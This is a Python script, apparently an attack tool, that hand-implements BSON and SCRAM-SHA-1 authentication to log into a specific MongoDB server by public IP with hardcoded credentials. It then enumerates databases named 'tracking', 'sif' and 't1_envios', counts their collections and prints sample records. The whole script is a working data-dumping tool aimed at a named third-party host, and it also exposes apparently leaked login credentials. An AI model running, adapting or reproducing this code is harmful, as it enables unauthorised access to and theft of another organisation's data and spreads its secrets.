#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket,struct,hashlib,hmac,base64,os,sys

HOST='3.231.83.29'
PORT=27017
USERNAME='appt1envios'
PASSWORD='4Ap971EnvI0KI1'
AUTH_DB='tracking'
TARGET_DBS=['tracking','sif','t1_envios']

def pbkdf2_sha1(password,salt,iterations,dklen=20):
    def _hmac_sha1(key,msg):
        return hmac.new(key,msg,hashlib.sha1).digest()
    dk=b''
    block=1
    while len(dk)<dklen:
        u=_hmac_sha1(password,salt+struct.pack('>I',block))
        result=bytearray(u)
        for _ in range(2,iterations+1):
            u=_hmac_sha1(password,u)
            result=bytearray(a^b for a,b in zip(result,bytearray(u)))
        dk+=bytes(result)
        block+=1
    return dk[:dklen]

def bson_string(key,value):
    kb=key.encode('utf-8')+b'\x00'
    vb=value.encode('utf-8')+b'\x00'
    return b'\x02'+kb+struct.pack('<i',len(vb))+vb

def bson_int32(key,value):
    kb=key.encode('utf-8')+b'\x00'
    return b'\x10'+kb+struct.pack('<i',value)

def bson_binary(key,data,subtype=0):
    kb=key.encode('utf-8')+b'\x00'
    return b'\x05'+kb+struct.pack('<i',len(data))+chr(subtype).encode('latin-1')+data

def build_bson(fields):
    body=b''.join(fields)
    total=4+len(body)+1
    return struct.pack('<i',total)+body+b'\x00'

def bson_read_cstring(data,pos):
    end=data.index(b'\x00',pos)
    return data[pos:end].decode('utf-8','replace'),end+1

def bson_decode(data,pos=0):
    doc_len=struct.unpack_from('<i',data,pos)[0]
    end=pos+doc_len
    result={}
    cur=pos+4
    while cur<end-1:
        etype=ord(data[cur:cur+1])
        cur+=1
        key,cur=bson_read_cstring(data,cur)
        if etype==0x01:
            val=struct.unpack_from('<d',data,cur)[0];cur+=8
        elif etype==0x02:
            slen=struct.unpack_from('<i',data,cur)[0];cur+=4
            val=data[cur:cur+slen-1].decode('utf-8','replace');cur+=slen
        elif etype==0x03:
            subdoc_len=struct.unpack_from('<i',data,cur)[0]
            val=bson_decode(data,cur);cur+=subdoc_len
        elif etype==0x04:
            subdoc_len=struct.unpack_from('<i',data,cur)[0]
            raw=bson_decode(data,cur)
            try: val=[raw[str(k)] for k in range(len(raw))]
            except: val=list(raw.values())
            cur+=subdoc_len
        elif etype==0x05:
            blen=struct.unpack_from('<i',data,cur)[0];cur+=4
            cur+=1
            val=data[cur:cur+blen];cur+=blen
        elif etype==0x07:
            val=data[cur:cur+12].encode('hex');cur+=12
        elif etype==0x08:
            val=(ord(data[cur:cur+1])==1);cur+=1
        elif etype==0x09:
            val=struct.unpack_from('<q',data,cur)[0];cur+=8
        elif etype==0x0A:
            val=None
        elif etype==0x10:
            val=struct.unpack_from('<i',data,cur)[0];cur+=4
        elif etype==0x11:
            val=struct.unpack_from('<Q',data,cur)[0];cur+=8
        elif etype==0x12:
            val=struct.unpack_from('<q',data,cur)[0];cur+=8
        elif etype==0x13:
            val='<decimal128>';cur+=16
        else:
            break
        result[key]=val
    return result

_req_id=[0]
def next_id():
    _req_id[0]+=1
    return _req_id[0]

def build_op_msg(bson_doc):
    flags=struct.pack('<I',0)
    section=b'\x00'+bson_doc
    payload=flags+section
    msg_len=16+len(payload)
    header=struct.pack('<iiii',msg_len,next_id(),0,2013)
    return header+payload

def recv_all(sock,n):
    buf=b''
    while len(buf)<n:
        chunk=sock.recv(n-len(buf))
        if not chunk: raise IOError("closed")
        buf+=chunk
    return buf

def send_recv(sock,bson_doc):
    sock.sendall(build_op_msg(bson_doc))
    header=recv_all(sock,16)
    msg_len=struct.unpack_from('<i',header,0)[0]
    body=recv_all(sock,msg_len-16)
    section=body[4:]
    return bson_decode(section,1)

def scram_auth(sock):
    mongo_pwd=hashlib.md5((USERNAME+':mongo:'+PASSWORD).encode('utf-8')).hexdigest().encode('utf-8')
    client_nonce=base64.b64encode(os.urandom(24)).decode('ascii')
    first_bare='n='+USERNAME+',r='+client_nonce
    first_msg='n,,'+first_bare

    doc=build_bson([bson_int32('saslStart',1),bson_string('mechanism','SCRAM-SHA-1'),bson_binary('payload',first_msg.encode('utf-8'),0),bson_string('$db',AUTH_DB)])
    resp=send_recv(sock,doc)
    if resp.get('ok')!=1.0 and resp.get('ok')!=1:
        print('saslStart FAIL: '+str(resp.get('errmsg',resp)))
        return False

    convo_id=resp['conversationId']
    sf=resp['payload']
    if isinstance(sf,(bytes,bytearray)): sf=sf.decode('utf-8')
    print('[+] saslStart OK convId='+str(convo_id))

    parts={}
    for p in sf.split(','):
        k=p[0];v=p[2:]
        parts[k]=v

    combined_nonce=parts['r']
    salt=base64.b64decode(parts['s'])
    iterations=int(parts['i'])
    print('[+] iterations='+str(iterations))

    salted_pw=pbkdf2_sha1(mongo_pwd,salt,iterations,20)
    client_key=hmac.new(salted_pw,b'Client Key',hashlib.sha1).digest()
    stored_key=hashlib.sha1(client_key).digest()
    cb=base64.b64encode(b'n,,').decode('ascii')
    cfnp='c='+cb+',r='+combined_nonce
    auth_msg=first_bare+','+sf+','+cfnp
    client_sig=hmac.new(stored_key,auth_msg.encode('utf-8'),hashlib.sha1).digest()
    proof=bytes(bytearray(a^b for a,b in zip(bytearray(client_key),bytearray(client_sig))))
    client_final=cfnp+',p='+base64.b64encode(proof).decode('ascii')

    doc2=build_bson([bson_int32('saslContinue',1),bson_int32('conversationId',convo_id),bson_binary('payload',client_final.encode('utf-8'),0),bson_string('$db',AUTH_DB)])
    resp2=send_recv(sock,doc2)
    if resp2.get('ok')!=1.0 and resp2.get('ok')!=1:
        print('saslContinue FAIL: '+str(resp2.get('errmsg',resp2)))
        return False
    print('[+] saslContinue OK')

    if not resp2.get('done'):
        doc3=build_bson([bson_int32('saslContinue',1),bson_int32('conversationId',convo_id),bson_binary('payload',b'',0),bson_string('$db',AUTH_DB)])
        resp3=send_recv(sock,doc3)
        print('[+] final done='+str(resp3.get('done')))

    print('[+] AUTH SUCCESS\n')
    return True

def list_dbs(sock):
    doc=build_bson([bson_int32('listDatabases',1),bson_string('$db','admin')])
    return send_recv(sock,doc)

def list_colls(sock,db):
    doc=build_bson([bson_int32('listCollections',1),bson_string('$db',db)])
    return send_recv(sock,doc)

def count_coll(sock,db,coll):
    doc=build_bson([bson_string('count',coll),bson_string('$db',db)])
    return send_recv(sock,doc)

def find_docs(sock,db,coll,limit=3):
    doc=build_bson([bson_string('find',coll),bson_int32('limit',limit),bson_int32('batchSize',limit),bson_string('$db',db)])
    return send_recv(sock,doc)

def safe_str(v,d=0):
    if d>4: return '...'
    if isinstance(v,dict):
        return '{'+','.join(k+':'+safe_str(w,d+1) for k,w in list(v.items())[:8])+'}'
    elif isinstance(v,list):
        return '['+','.join(safe_str(i,d+1) for i in v[:4])+']'
    elif isinstance(v,(bytes,bytearray)):
        try: return v.decode('utf-8','replace')[:80]
        except: return repr(v)[:80]
    else:
        return str(v)[:100]

print('='*50)
print(' MongoDB SCRAM-SHA-1 Dump')
print(' Target: %s:%d'%(HOST,PORT))
print('='*50)

sock=socket.socket()
sock.settimeout(30)
print('[*] Connecting...')
sock.connect((HOST,PORT))
print('[+] Connected')

if not scram_auth(sock):
    sock.close()
    sys.exit(1)

print('[*] listDatabases...')
r=list_dbs(sock)
dbs=r.get('databases',[])
if isinstance(dbs,dict): dbs=list(dbs.values())
print('[+] DBs: '+str([d.get('name','?') if isinstance(d,dict) else d for d in dbs]))

for dbname in TARGET_DBS:
    print('\n'+'='*50)
    print(' DB: '+dbname)
    print('='*50)
    r=list_colls(sock,dbname)
    cursor=r.get('cursor',{})
    batch=cursor.get('firstBatch',[]) if isinstance(cursor,dict) else []
    if isinstance(batch,dict): batch=list(batch.values())
    colls=[c.get('name','?') if isinstance(c,dict) else c for c in batch]
    print('Collections: '+str(colls))
    for coll in colls:
        cr=count_coll(sock,dbname,coll)
        cnt=cr.get('n',cr.get('count','?'))
        print('\n  %s.%s (count=%s)'%(dbname,coll,cnt))
        fr=find_docs(sock,dbname,coll,3)
        fc=fr.get('cursor',{})
        docs=fc.get('firstBatch',[]) if isinstance(fc,dict) else []
        if isinstance(docs,dict): docs=list(docs.values())
        for i,doc in enumerate(docs):
            if isinstance(doc,dict):
                print('    [%d]'%i)
                for k,v in list(doc.items())[:15]:
                    print('      %-25s = %s'%(k,safe_str(v)))
            else:
                print('    [%d] %s'%(i,safe_str(doc)))

sock.close()
print('\n[+] Done.')
